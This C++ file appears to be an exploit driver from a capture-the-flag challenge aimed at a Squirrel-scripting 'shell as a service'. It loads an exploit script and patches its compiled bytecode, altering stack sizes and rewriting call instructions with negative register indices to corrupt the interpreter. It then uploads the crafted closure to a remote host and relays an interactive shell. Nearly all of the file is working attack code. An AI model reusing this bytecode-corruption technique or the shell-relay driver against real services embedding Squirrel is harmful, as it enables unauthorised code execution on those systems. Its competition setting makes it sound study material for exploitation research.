#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <poll.h>
#include <netdb.h>

#include <memory>
#include <initializer_list>
#include <vector>
#include <string>

#include <squirrel.h>
#include <squirrel/sqpcheader.h>
#include <squirrel/sqstring.h>
#include <squirrel/sqopcodes.h>
#include <squirrel/sqvm.h>
#include <squirrel/sqfuncproto.h>
#include <squirrel/sqstate.h>
#include <squirrel/sqtable.h>
#include <squirrel/sqclosure.h>
#include <squirrel/sqobject.h>
#include <sqstdblob.h>
#include <sqstdsystem.h>
#include <sqstdio.h>
#include <sqstdmath.h>
#include <sqstdstring.h>
#include <sqstdaux.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

#define phase(fmt, ...) fprintf(stderr, "\e[43müöÄ\e[0m " fmt "\n", ##__VA_ARGS__);
#define debug(fmt, ...) fprintf(stderr, "\e[47müêû\e[0m\e[31m " fmt "\e[0m\n", ##__VA_ARGS__);

#ifdef SQUNICODE
#define scfprintf fwprintf
#define scvprintf vfwprintf
#else
#define scfprintf fprintf
#define scvprintf vfprintf
#endif

bool executing = false;
volatile bool debug = false;

void printfunc(HSQUIRRELVM SQ_UNUSED_ARG(v), const SQChar* s, ...)
{
	va_list vl;
	va_start(vl, s);
	scvprintf(stdout, s, vl);
	va_end(vl);
}

void errorfunc(HSQUIRRELVM SQ_UNUSED_ARG(v), const SQChar* s, ...)
{
	va_list vl;
	va_start(vl, s);
	scvprintf(stderr, s, vl);
	va_end(vl);
}


void debugfunc(HSQUIRRELVM vm, SQInteger type, const SQChar* source, SQInteger line, const SQChar* funcname) {
    //debug("debug hook: %lld %s %lld %s", type, source, line, funcname);
    if (funcname && !strcmp(funcname, "debugtrap") && debug || debug && line == 42) {
        asm("int $0x03");
    }
}

SQInteger str_write(SQUserPointer up, SQUserPointer data, SQInteger size) {
    auto b = static_cast<std::string*>(up);
    size_t top = b->size();
    b->resize(top+size);
    auto data_char = static_cast<char*>(data);
    std::copy(data_char, data_char + size, b->begin()+top);
    return size;
}

SQFunctionProto* funcFromInstrs(HSQUIRRELVM vm, const char* name, int paramcount, int stacksize, std::vector<SQInstruction> code) {
    SQFunctionProto *func = SQFunctionProto::Create(
        _ss(vm),
        code.size(), /* ninstructions */
        0, /* nliterals */
        paramcount, /* nparameters */
        0, /* nfunctions */
        0, /* noutervalues */
        0, /* nlineinfos */
        0, /* nlocalvarinfos */
        0 /* ndefaultparms */
    );

    std::copy(code.begin(), code.end(), func->_instructions);
    func->_name = SQString::Create(_ss(vm), name);
    func->_sourcename = SQString::Create(_ss(vm), "generated");
    func->_stacksize = stacksize;
    func->_varparams = 0;

    return func;
}

void CHECK(HSQUIRRELVM vm, SQRESULT result) {
        if (SQ_SUCCEEDED(result)) return;

        printf("Error! :/\n");

        const SQChar* err;
        sq_getlasterror(vm);
        if (SQ_SUCCEEDED(sq_getstring(vm, -1, &err))) {
            scprintf(_SC("Error [%s]\n"), err);
        }
        exit(1);
}

const char *banner =
"      _          _ _                                           _          \n"
"  ___| |__   ___| | |   __ _ ___    __ _   ___  ___ _ ____   _(_) ___ ___ \n"
" / __| '_ \\ / _ \\ | |  / _` / __|  / _` | / __|/ _ \\ '__\\ \\ / / |/ __/ _ \\\n"
" \\__ \\ | | |  __/ | | | (_| \\__ \\ | (_| | \\__ \\  __/ |   \\ V /| | (_|  __/\n"
" |___/_| |_|\\___|_|_|  \\__,_|___/  \\__,_| |___/\\___|_|    \\_/ |_|\\___\\___|\n";


int main(const int argc, char const* const* const argv) {
    puts(banner);
    const char* host = (argc > 1) ? argv[1] : "hax1.allesctf.net";
    const char* port = (argc > 2) ? argv[2] : "9888";

    auto vm = sq_open(1024);
	sq_setprintfunc(vm, printfunc, errorfunc);

    sq_pushroottable(vm);
    sqstd_register_bloblib(vm);
    sqstd_register_mathlib(vm);
    sqstd_register_stringlib(vm);

    // make sure that sqstd_register_systemlib is actually called so the optimizer
    // does not remove the code for it
    if (argc == 100000) {
        sqstd_register_systemlib(vm);
    }

    CHECK(vm, sqstd_loadfile(vm, "./exploit.nut", SQTrue));
    auto exploitFunc = _closure(vm->Top())->_function;
    debug("stack %lld", exploitFunc->_stacksize);

    // patch function stack size
    for (int fidx = 0; fidx < exploitFunc->_nfunctions; ++fidx) {
        auto func = _funcproto(exploitFunc->_functions[fidx]);
        if (sq_type(func->_name) != OT_STRING) continue;

        const char* name = _string(func->_name)->_val;
        if (strncmp(name, "stack", strlen("stack")) == 0) {
            int size = atoi(name + strlen("stack"));
            func->_stacksize = size;
            debug("adjusted stack size of %s", name);
        }
    }

    // patch CALL instructions for special features
    for (int pidx = 0; pidx < exploitFunc->_ninstructions; ++pidx) {
        SQInstruction& prepcall = exploitFunc->_instructions[pidx];
        if (prepcall.op != _OP_PREPCALLK) continue;
        const char* name = _string(exploitFunc->_literals[prepcall._arg1])->_val;

        SQInstruction* call = NULL;
        for (int cidx = pidx; cidx < exploitFunc->_ninstructions; ++cidx) {
            SQInstruction* c = exploitFunc->_instructions + cidx;
            if (c->op == _OP_CALL && c->_arg1 == prepcall._arg0) {
                call = c;
                break;
            }
        }

        if (strncmp(name, "setMinus", strlen("setMinus")) == 0) {
            int idx = -atoi(name + strlen("setMinus"));

            call->_arg0 = idx;
            debug("patched call to %s", name);
        }
    }

    if (!strcmp(host, "test")) {
        phase("executing");

        sq_setprintfunc(vm, printfunc, errorfunc);
        sqstd_seterrorhandlers(vm);
        sq_setnativedebughook(vm, debugfunc);


        HSQOBJECT obj;
        sq_getstackobj(vm, -1, &obj);
        sq_addref(vm, &obj);
        sq_pop(vm, 1);

        sq_pushobject(vm, obj);
        sq_pushroottable(vm);
        executing = true;
        CHECK(vm, sq_call(vm, 1, 0, 1));
    } else if (!strcmp(host, "save")) {
        phase("save to exploit.cnut");
        sqstd_writeclosuretofile(vm, "exploit.cnut");
    } else {
        phase("%s:%s", host, port);
        std::string serialized;
        sq_writeclosure(vm, str_write, &serialized);
        debug("serialized length: %ld", serialized.size());


        struct addrinfo hints;

        memset(&hints, 0, sizeof(struct addrinfo));
        hints.ai_family = AF_UNSPEC;     /* Allow IPv4 or IPv6 */
        hints.ai_socktype = SOCK_STREAM; /* Stream socket */
        hints.ai_flags = 0;
        hints.ai_protocol = 0;          /* Any protocol */


        struct addrinfo *rp;
        int errc;
        if ((errc = getaddrinfo(host, port, &hints, &rp)) != 0) {
            fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(errc));
            exit(EXIT_FAILURE);
        }

        /* getaddrinfo() returns a list of address structures.
            Try each address until we successfully connect(2).
            If socket(2) (or connect(2)) fails, we (close the socket
            and) try the next address. */
        int sfd = -1;
        for (; rp != NULL; rp = rp->ai_next) {
            sfd = socket(rp->ai_family, rp->ai_socktype,
                        rp->ai_protocol);
            if (sfd == -1)
                continue;

            if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
                break;                  /* Success */

            close(sfd);
        }

        phase("connected");
        char buf[0x401] = {0};
        while (!strstr(buf, "Enter code length:")) {
            buf[read(sfd, buf, 0x400)] = 0;
        }
        dprintf(sfd, "%ld\n", serialized.size());

        while (!strstr(buf, "Enter Code:")) {
            buf[read(sfd, buf, 0x400)] = 0;
        }

        if (argc > 3 && !strcmp(argv[3], "deb")) {
            debug("attach debugger now...");
            getchar();
        }
        for (int count = 0; count < serialized.size(); ) {
            int written = write(sfd, serialized.data() + count, serialized.size() - count);
            debug("written %d", written);
            count += written;
        }

        fprintf(stderr, "$ ");
        fflush(stdout);
        fd_set rfds;
        while (true) {
            struct pollfd fds[] = { {0, POLLIN, 0}, {sfd, POLLIN, 0} };
            poll(fds, sizeof(fds) / sizeof(fds[0]), -1);
            if (fds[1].revents) {
                buf[read(sfd, buf, 0x400)] = 0;
                printf("%s", buf);
                fflush(stdout);
            }
            if (fds[0].revents) {
                int count = read(0, buf, 0x400);
                write(sfd, buf, count);
            }
        };
        close(sfd);
    }
}
